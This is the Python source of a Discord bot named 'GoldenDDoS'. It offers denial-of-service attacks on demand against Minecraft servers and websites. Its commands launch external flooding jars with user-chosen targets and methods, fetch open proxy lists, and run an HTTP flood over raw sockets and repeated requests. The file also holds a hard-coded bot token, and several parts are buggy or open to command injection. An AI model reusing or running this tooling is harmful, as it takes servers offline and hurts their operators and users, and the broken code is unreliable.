import discord,urllib,os,threading,requests,json,asyncio,psutil,tracemalloc,socket,random
from discord.ext import commands
from urllib.request import urlopen

BotToken = "OTkwMTU4NjYxODYxMTQyNTU4.GMzBVW.bj2WzFKbdnVV4kFFOQw7hbc1w07CKJl3BUvfB0"
SupportedMethods = ['join','legitjoin','localhost','invalidnames','longnames','botjoiner','power','spoof','ping','spam','killer','nullping','charonbot','multikiller','packet','handshake','bighandshake','query','bigpacket','network','randombytes','extremejoin','spamjoin','nettydowner','memory','yoonikscry','colorcrasher','tcphit','queue','botnet','tcpbypass','ultimatesmasher','sf','nabcry','rip']
BotChanneId = 992523790762397848
SupportedProtocols = ['759','758','757','756','755','754','753','751','736','735','578','575','573', '498', '490', '485', '480', '477', '404', '401', '393', '340', '338 ', '335', '316', '210', '110', '109', '107', '47']
ProtocolsList = ['1.19: 759','1.18.2: 758', '1.18.1/1.18: 757', '1.17.1: 756', '1.17: 755', '1.16.5/1.16.4: 754', '1.16.3: 753', '1.16.2: 751', '1.16.1: 736', '1.16: 735', '1.15.2: 578', '1.15.1: 575', '1.15: 573', '1.14.4: 498', '1.14.3: 490', '1.14.2: 485', '1.14.1: 480', '1.14: 477', '1.13.2: 404', '1.13.1: 401', '1.13: 393', '1.12.2: 340', '1.12.1: 338', '1.12: 335', '1.11.2/1.11.1: 316', '1.11: 315' '1.10.2/1.10.1: 210', '1.9.4/1.9.3: 110', '1.9.2: 109', '1.9.1: 107', '1.8.9/1.8.8/1.8.7/1.8.6/1.8.5/1.8.4/1.8.3/1.8.2/1.8.1/1.8: 47']

client = commands.Bot(command_prefix='!')
client.remove_command('help')

@client.event
async def on_command_error(ctx, error):
  if isinstance(error, discord.ext.commands.CommandNotFound):
    await ctx.reply(embed = discord.Embed(title='**❌ ERROR**',description=f'🔍❓ Command not found. See all commands in !help.',color=discord.Colour.random()))


@client.command()
async def help(ctx):
  Embed = discord.Embed(
    title='>> 💭HELP PAGES💭 <<',
    description='List of help pages',
    color=discord.Colour.random()
  )
  Embed.add_field(name='!mcddoshelp / !mcdhelp', value='👹Minecraft Server DDoS #1 Help Page')
  Embed.add_field(name='!mcddos2help / !mcd2help', value='👹Minecraft Server DDoS #2 Help Page')
  Embed.add_field(name='!urlddoshelp / !udhelp', value='🧨URL DDoS Help Page')
  Embed.add_field(name='!proxyhelp / !phelp', value='💦Proxy Help Page')
  Embed.set_footer(text="GoldenDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
  if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
  await ctx.reply(embed=Embed)


@client.command(name='')
async def sysstats(ctx):
    embed = discord.Embed(
      title = '**📊SYSTEM RESOURCE USAGE📊**', 
      description = 'System resource usage of server or bot.'
    )
    embed.add_field(name = '**🥏[CPU]**', value = f'{psutil.cpu_percent()}% OF {os.cpu_count()} CORES', inline = True)
    embed.add_field(name = '**📈[RAM]**', value = f'{psutil.virtual_memory().percent}%', inline=True)
    embed.set_footer(text="GoldenDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
    if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
    await ctx.reply(embed=embed)


@client.command()
async def clear(ctx):
  def cleaning():
    tracemalloc.clear_traces()
    os.system("pkill 'java'")
    os.system("taskkill /im java.exe /f /t")
  embed = discord.Embed(
    title='📉 SUCCESSFULLY CLEANED 📉',
    description=f'💨 Successfully cleaned bot by {ctx.author.mention}',
    color=discord.Colour.random()
  )
  embed.add_field(name="⚠WARNING:", value="Attacks on Minecraft servers have been stopped")
  await ctx.reply(embed=embed)
  threading.Thread(target=cleaning)
  await client.close(BotToken)
  await client.connect(BotToken,reconnect=True)
  await client.login(BotToken,bot=True)


@client.command(name='mcas')
async def mcattackstop(ctx):
    os.system("taskkill /im java.exe /f")
    os.system("pkill 'java'")
    embed = discord.Embed(
        title='⛔ STOPPED MINECRAFT SERVER ATTACKS',
        description=f'{ctx.author.mention} stopped all minecraft server attacks.',
        color=discord.Colour.random()
    )
    embed.set_footer(text="GoldenDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
    if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
    await ctx.reply(embed=embed)


@client.command(name='up')
@commands.has_any_role(992512261740568606, 992512808195465346, 995599353081249833)
async def updateproxy(ctx):
    def update():
        Socks4URL = "https://api.openproxylist.xyz/socks4.txt"
        Socks5URL = "https://api.openproxylist.xyz/socks5.txt"
        path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'proxies.txt')
        if os.path.exists(path):
          os.system("rem proxies.txt")
        r = requests.get(Socks4URL, allow_redirects=True)
        open('proxies.txt', 'wb').write(r.content)
        r2 = requests.get(Socks5URL, allow_redirects=True)
        open('proxies.txt', 'wb').write(r2.content)

    EmbedUpdate = discord.Embed(
      title='💦Прокси успешно обновлено',
      description='Типы прокси: Socks4, Socks5',
      color=discord.Colour.random()
    )
    EmbedUpdate.set_footer(text="GoldenDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
    if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
    await ctx.reply(embed=EmbedUpdate)
    threading.Thread(target=update).start()


@client.command()
async def getproxy(ctx):
  path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'proxies.txt')
  if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
  await ctx.reply(":x: Получение прокси недоступно")


@client.command(name='mcdhelp')
async def mcddoshelp(ctx):
  EmbedHelp = discord.Embed(
    title = '💭 MINECRAFT SERVER DDoS #1 HELP 💭',
    color = discord.Colour.random()
  )
  EmbedHelp.add_field(
    name='!mcddoshelp / !mcdhelp',
    value='🧨❓ MINECRAFT SERVER DDoS #1 HELP PAGE',
    inline=True
  )
  EmbedHelp.add_field(
    name='!mcattack / !mca <IP:PORT> <PROTOCOL (VERSION)> <METHOD> <TIME IN SECONDS> <CPS (POWER)>',
    value='🏹 ATTACK THE MINECRAFT SERVER',
    inline=True
  )
  EmbedHelp.add_field(
    name='!mcattackstop / !mcas',
    value='😡 STOP ALL MINECRAFT SERVER ATTACKS',
    inline=True
  )
  EmbedHelp.add_field(
    name='!mcprotocols / !mcp',
    value='🎫 PROTOCOLS OF MINECRAFT VERSIONS',
    inline=True
  )
  EmbedHelp.add_field(
    name='!mcattackmethods / !mcam',
    value='❓ MINECRAFT SERVER ATTACK METHODS',
    inline=True
  )
  EmbedHelp.add_field(
    name='!mcresolve / !mcr <IP:PORT>',
    value='🤓 RESOLVE INFORMATION ABOUT MINECRAFT SERVER',
    inline=True
  )
  EmbedHelp.add_field(
    name='!mcresolve2 / !mcr2 <IP:PORT>',
    value='🤓 GET THE LINKS TO INFORMATION ABOUT MINECRAFT SERVER',
    inline=True
  )
  EmbedHelp.set_footer(text="GoldenDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
  if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
  await ctx.reply(embed=EmbedHelp)


@client.command(name='mcd2help')
async def mcddos2help(ctx):
  EmbedHelp = discord.Embed(
    title = '**>> 💭MINECRAFT SERVER DDoS #2 HELP💭 <<**',
    color = discord.Colour.random()
  )
  EmbedHelp.add_field(
    name='!mcddos2help',
    value='💭 MINECRAFT SERVER DDoS #2 HELP PAGE',
    inline=True
  )
  EmbedHelp.add_field(
    name='!mcattack2bdp <IP (NO PORT)> <PORT> <THREADS>',
    value='💩 ATTACK THE MINECRAFT SERVER WITH BADPACKETS',
    inline=True
  )
  EmbedHelp.add_field(
    name='!mcattack2spam',
    value='📮 ATTACK THE MINECRAFT SERVER WITH SPAMMING',
    inline=True
  )
  EmbedHelp.set_footer(text="GoldenDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
  if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
  await ctx.reply(embed=EmbedHelp)


@client.command(name='udhelp')
async def urlddoshelp(ctx):
  Embed = discord.Embed(
    title='**>> 💨URL DDOS HELP PAGE💨 <<**',
    color=discord.Colour.random()
  )
  Embed.add_field(name='!urlddoshelp', value='💭 URL DDoS HELP PAGE ')
  Embed.add_field(name='!urlattack <URL> <PORT> <PACKETS> <THREADS>', value='💨 ATTACK THE WEBSITE')
  Embed.set_footer(text="GoldenDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
  if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
  await ctx.reply(embed=Embed)


@client.command(name='phelp')
async def proxyhelp(ctx):
  embed = discord.Embed(
    title='**>> 💦PROXY HELP💦 <<',
    color=discord.Colour.random()
  )
  embed.add_field(
    name='!updateproxy',
    value='💦 UPDATE BOT PROXY FOR MINECRAFT SERVER ATTACK #1',
    inline=True
  )
  embed.add_field(
    name='!getproxy',
    value='💦 GET PROXY URL AND FILES ',
    inline=True
  )
  if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
  await ctx.reply(embed=embed)


@client.command(name='ohelp')
async def otherhelp(ctx):
  EmbedHelp = discord.Embed(
    title='**>> 💭OTHER FUNCTIONS HELP💭 <<**',
    color=discord.Colour.random()
  )
  EmbedHelp.add_field(
    name='!sysstats',
    value='📈[SYSTEM RESOURCE USAGE STATS]',
    inline=True
  )
  EmbedHelp.set_footer(text="GoldenDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
  if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
  await ctx.reply(embed=EmbedHelp)


@client.command(name='mcp')
async def mcprotocols(ctx):
    embed = discord.Embed(
        title="**>> 🎫PROTOCOLS🎫 <<**",
        description='This is all protocols of minecraft versions.',
        color=discord.Colour.random()
    )
    embed.add_field(name='🎫:', value=', '.join([i for i in ProtocolsList]), inline=True)
    embed.set_footer(text="GoldenDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
    if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
    await ctx.reply(embed=embed)


@client.command(name='mcam')
async def mcattackmethods(ctx):
    embed = discord.Embed(
      title="📁 ALL METHODS 📁",
      color=discord.Colour.random()
    )
    embed.add_field(name='📂:', value=', '.join([i for i in SupportedMethods]), inline=True)
    embed.set_footer(text="GoldenDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")
    if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
    await ctx.reply(embed=embed)


@client.command(name='mcr')
async def mcresolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urlopen(url=f"{url}")
    for line in file:
        decoded_line = line.decode("utf-8")
    json_object = json.loads(decoded_line)

    e = discord.Embed(
        title="**✅ RESOLVED SUCCESSFULLY**",
        description=f'👨‍💻🥵😈Successfully resolved information about {arg1}🤯🥵',
        color=discord.Colour.random()
    )

    e.add_field(name='**💡 𝕆ℕ𝕃𝕀ℕ𝔼:**', value=json_object["online"], inline=True)
    e.add_field(name='**🔥 𝕀ℙ:**', value=json_object["ip"], inline=True)
    e.add_field(name='**💦 ℙ𝕆ℝ𝕋:**', value=json_object["port"], inline=True)
    e.add_field(name='**🎫 𝕍𝔼ℝ𝕊𝕀𝕆ℕ:**', value=f'{json_object["version"]} / {json_object["protocol"]}', inline=True)
    e.add_field(name='**👶 ℙ𝕃𝔸𝕐𝔼ℝ𝕊:**', value=json_object["players"], inline=True)
    e.add_field(name='For more information about this server you can get in this URL below,', value="**in this url you can get software, plugins, MOTD and other:**", inline=False)
    e.add_field(name=f'{url}', value="^ Press to open ^", inline=False)
    e.set_footer(text="GoldenDDoS", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")

    if json_object["online"] == False:
      embed = discord.Embed(
        title='**❌ [ERROR]:**',
        description=f'Sorry, but we can`t resolve information about minecraft server {arg1}',
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
    if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
    await ctx.reply(embed=e)


@client.command(name='mcr2')
async def mcresolve2(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    e = discord.Embed(
        title="**✅ RESOLVED SUCCESSFULLY**",
        description=f'👨‍💻🥵😈Successfully resolved information about {arg1}🤯🥵',
        color=discord.Colour.random()
    )
    e.add_field(name='You are successfully getted the links', value=f'Press link to view information about this server', inline=False)
    e.add_field(name=f'{url}', value=f'^ Press ^')
    e.set_footer(text="GoldenDDoS, API: https://mcapi.us AD: dsc.gg/q4ch q4ch Top, https://t.me/q4ch_webm")

    if ctx.message.channel.id != BotChanneId:
      embed = discord.Embed(
        title=f"**❌ ERROR**.",
        description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
    await ctx.reply(embed=e)


@client.command(name='mca')
async def mcattack(ctx, arg1, arg2, arg3, arg4, arg5):
    def attack1():
      os.system(
          f"java -jar mcddos.jar {arg1} {arg2} {arg3} {arg4} {arg5}"
      )

    embed = discord.Embed(
        title='**✅🚀 ATTACK SENT SUCCESSFULLY 🚀✅**',
        description=f'🥵🤡ATTACK SENT BY {ctx.author.mention} 🥵🥵🤬:wink:',
        color=discord.Colour.random()
    )

    embed.add_field(name='**🎪 ℍ𝕆𝕊𝕋:**', value=f'{arg1}', inline=True)
    embed.add_field(name='**🎫 ℙℝ𝕆𝕋𝕆ℂ𝕆𝕃:**', value=f'{arg2}', inline=True)
    embed.add_field(name='**❓ 𝕄𝔼𝕋ℍ𝕆𝔻:**', value=f'{arg3}', inline=True)
    embed.add_field(name='**⏱ 𝕋𝕀𝕄𝔼:**', value=f'{arg4} Seconds', inline=True)
    embed.add_field(name='**💪 ℂℙ𝕊:**', value=f'{arg5}', inline=True) 
    embed.set_image(url=f'https://c.tenor.com/IOIm52mh9OgAAAAC/plutus-plutus-rocket.gif')
    embed.set_footer(text="GoldenDDoS, Minecraft server DDoS service", icon_url="https://c.tenor.com/wl8v_qdsA8EAAAAC/trollge-massacare.gif")

    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urlopen(url=f"{url}")
    for line in file:
        decoded_line = line.decode("utf-8")
    json_object = json.loads(decoded_line)

    if json_object["online"] == False:
        embed = discord.Embed(
          title="**❌ [ERROR]**",
          description=f'⭕ This server is offline or not found.',
          color = discord.Colour.random()
        )
        await ctx.reply(embed=embed)
        return

    if str(arg2) not in SupportedProtocols:
        embed = discord.Embed(
          title=f"❌ ERROR",
          description=f"🎫❓ Protocol not found. See all Minecraft protocols in !mcprotocols, example: 1.12.2 is 340",
          color=discord.Colour.random()
        )
        await ctx.reply(embed=embed)
        return

    if str(arg3) not in SupportedMethods:
        embed = discord.Embed(
          title=f"❌ ERROR",
          description=f"🧨❓ Method not found. See all attack methods in !mcattackmethods",
          color=discord.Colour.random()
        )
        await ctx.reply(embed=embed)
        return

    if ctx.message.channel.id != BotChanneId:
        embed = discord.Embed(
          title=f"**❌ ERROR",
          description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
          color=discord.Colour.random()
        )
        await ctx.reply(embed=embed)
        return

    if int(arg4) > 120:
      embed = discord.Embed(
        title='❌ ERROR',
        description=f'⏱❗ Sorry, but you cannot attack Minecraft server more than 120 seconds',
        color=discord.Colour.random()
      )
      await ctx.reply(embed=embed)
      return
    
    await ctx.reply(embed=embed)
    threading.Thread(target=attack1).start()


@client.command()
async def mcattack2bdp(ctx, arg1, arg2, arg3):
    def attack2():
      os.system(
          f"java -jar bdp.jar host-{arg1} port-{arg2} threads-{arg3}"
      )

    embed = discord.Embed(
        title='**✅🚀 ATTACK SENT SUCCESSFULLY 🚀✅**',
        description=f'🥵🤡ATTACK SENT BY {ctx.author.mention} 🥵🥵🤬:wink:',
        color=discord.Colour.random()
    )

    embed.add_field(name='**💥[IP]:**', value=f'{arg1}', inline=True)
    embed.add_field(name='**💦[PORT]:**', value=f'{arg2}', inline=True)
    embed.add_field(name='**📈[THREADS]:**', value=f'{arg3}', inline=True)
    embed.set_image(url=f'https://i.gifer.com/6IX.gif')
    embed.set_footer(text="🧡💛GOLDENDDOS By Wawastera Corporation💛🧡")

    url = "https://mcapi.us/server/status?ip=" + arg1
    file = urlopen(url)
    for line in file:
        decoded_line = line.decode("utf-8")
    json_object = json.loads(decoded_line)

    if json_object["online"] == "false":
        embed = discord.Embed(
          title="**❌ [ERROR]**",
          description=f'⭕ This server is offline or not found.',
          color = discord.Colour.random()
        )
        await ctx.reply(embed=embed)
        return

    if ctx.message.channel.id != BotChanneId:
        embed = discord.Embed(
          title=f"❌ ERROR",
          description=f"💬❌ Invalid chat. You can use botin <#{BotChanneId}>.",
          color=discord.Colour.random()
        )
        await ctx.reply(embed=embed)
        return
    
    await ctx.reply(embed=embed)
    threading.Thread(target=attack2).start()


@client.command()
async def mcattack2spam(ctx, arg1):
  def spam():
    os.system(f"java -jar ")

  await ctx.send(":x: Ета команда еще не доступна, пожалуйста если у вас есть jar файл на атаку Minecraft серверов со спамом тогда киньте нам!")
  url = "https://api.mcsrvstat.us/2/" + arg1
  file = urllib.request.urlopen(url)
  for line in file:
    decoded_line = line.decode("utf-8")
  json_object = json.loads(decoded_line)

  if json_object["online"] == "false":
    embed = discord.Embed(
      title="**❌ [ERROR]**",
      description=f'⭕ This server is offline or not found.',
      color = discord.Colour.random()
    )
    await ctx.send(embed=embed)
    return

  if ctx.message.channel.id != BotChanneId:
    embed = discord.Embed(
      title=f"❌ **[ERROR]**.",
      description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
      color=discord.Colour.random()
    )
    await ctx.reply(embed=embed)
    return
    
  await ctx.reply(embed=embed)
  threading.Thread(target=spam).start()


@client.command()
async def urlattack(ctx, arg1, arg2, arg3, arg4):
  acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
  "Accept-Encoding: gzip, deflate\r\n",
  "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
  "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
  "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
  "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
  "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
  "Accept-Language: en-US,en;q=0.5\r\n"]
  useragen = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  accept = random.choice(acceptall)
  reffer = "Referer: "+random.choice(ref)+str(arg1) + "\r\n"
  content = "Content-Type: application/x-www-form-urlencoded\r\n"
  length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
  target_host = f"GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(arg1), int(arg2))
  main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
  ref=['http://www.bing.com/search?q=',
  'https://www.yandex.com/yandsearch?text=',
  'https://duckduckgo.com/?q=']
  def attack2():
    requests.get(url=f"{arg1}", allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'}, verify=True)
    requests.post(url=f"{arg1}", allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'}, verify=True)
    requests.head(url=f"{arg1}", allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'}, verify=True)
    requests.put(url=f"{arg1}", allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'}, verify=True)
    requests.delete(url=f"{arg1}", allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'}, verify=True)
    requests.api.get(url=f"{arg1}", allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'}, verify=True)
    requests.api.post(url=f"{arg1}", allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'}, verify=True)
    requests.api.head(url=f"{arg1}", allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'}, verify=True)
    requests.api.put(url=f"{arg1}", allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'}, verify=True)
    requests.api.delete(url=f"{arg1}", allow_redirects=True, headers={'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/69.0'}, verify=True)
    s.connect((str(arg1),int(arg2)))
    s.send(str.encode(main_req))
    for i in range(arg3):
      s.send(str.encode(main_req))
    xx += random.randint(0, int(arg3))
    print(f"Requests sent. System usage: CPU Usage: {psutil.cpu_percent()}%, RAM Usage: {psutil.virtual_memory().percent}%")
    threading.Thread(target=attack2).start()

  embed = discord.Embed(
    title='**✅🚀 ATTACK SENT SUCCESSFULLY 🚀✅**',
    description=f'🤡🤬🥵ATTACK SENT SUCCESSFULLY BY {ctx.author.mention}',
    color=discord.Colour.random()
  )
  embed.add_field(name='🎪 𝕋𝔸ℝ𝔾𝔼𝕋:', value=f'{arg1}', inline=True)
  embed.set_image(url="https://media1.tenor.com/images/5ab1d61371e78adba2d9bc3ffbb09976/tenor.gif?itemid=26286238")
  embed.set_footer(text="GoldenDDoS, URL DDoS Service TIPS: **По умолчанию в протоколе HTTP используется порт 80, а в протоколе HTTPS — порт 443. URL вида http://www.example.com:8080/path/ указывает, что веб-ресурс обслуживается веб-сервером на порту 8080.**")

  if ctx.message.channel.id != BotChanneId:
    embed = discord.Embed(
      title=f"❌ ERROR",
      description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
      color=discord.Colour.random()
    )
    await ctx.reply(embed=embed)
    return
  
  await ctx.reply(embed=embed)
  threading.Thread(target=attack2).start()
  print(f"Started DDoS-ing URL {arg1}")
  print(f"Started by {ctx.author.mention}")


@client.command(name='dscserverinfo')
async def dscserverinfo(ctx, arg1):
  url = f"https://discord.com/api/guilds/{arg1}/widget.json"
  serverinfo = requests.get(url=f"{url}")
  
  for line in serverinfo:
    decoded_line = line.decode("utf-8")
  
  json_object = json.loads(decoded_line)

  ei = discord.Embed(
    title="✅👾 SUCCESSFULLY GETTED INFORMATION ABOUT DISCORD SERVER ✅👾",
    description=f'🥵😈Successfully resolved information about {arg1}🤯🥵',
    color=discord.Colour.random()
  )
  ei.add_field(name='**[💥GUILD NAME]:**', value=json_object["name"], inline=True)
  ei.add_field(name='**[🔥GUILD ID]:**', value=json_object["id"], inline=True)
  ei.add_field(name='**[💦INSTANT INVITE]:**', value=json_object["instant_invite"], inline=True)
  ei.add_field(name='**[✅PRESENCE COUNT]:**', value=json_object["presence_count"], inline=True)
  ei.set_footer(text="GoldenDDoS, AD: dsc.gg/q4ch q4ch Top")
  if arg1 == None:
    embed = discord.Embed(
      title=f"❌ ERROR",
      description=f"❓ Unknown guild ID",
      color=discord.Colour.random()
    )
    await ctx.reply(embed=embed)
    return
  if ctx.message.channel.id != BotChanneId:
    embed = discord.Embed(
      title=f"❌ ERROR",
      description=f"💬❌ Invalid chat. You can use bot in <#{BotChanneId}>.",
      color=discord.Colour.random()
    )
    await ctx.reply(embed=embed)
    return
  await ctx.reply(embed=ei)

client.run(BotToken)